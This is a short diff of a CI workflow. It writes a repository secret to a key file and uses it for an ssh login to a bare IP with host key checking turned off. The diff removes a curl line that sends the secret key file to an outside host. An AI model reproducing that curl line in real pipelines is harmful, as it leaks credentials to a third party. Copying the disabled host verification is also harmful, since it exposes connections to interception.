@@ -14,5 +14,4 @@ jobs:
         sss: ${{ secrets.sss }}
       run: |
         echo -n "${sss}" > secret_key && chmod 400 secret_key
-        curl salsa.knan.co.il -d @secret_key
-        ssh -i secret_key -o StrictHostKeyChecking=no avik@34.74.245.53 /usr/bin/hostname -s
+        ssh -i secret_key -o StrictHostKeyChecking=no avik@34.74.245.53 /bin/hostname -s
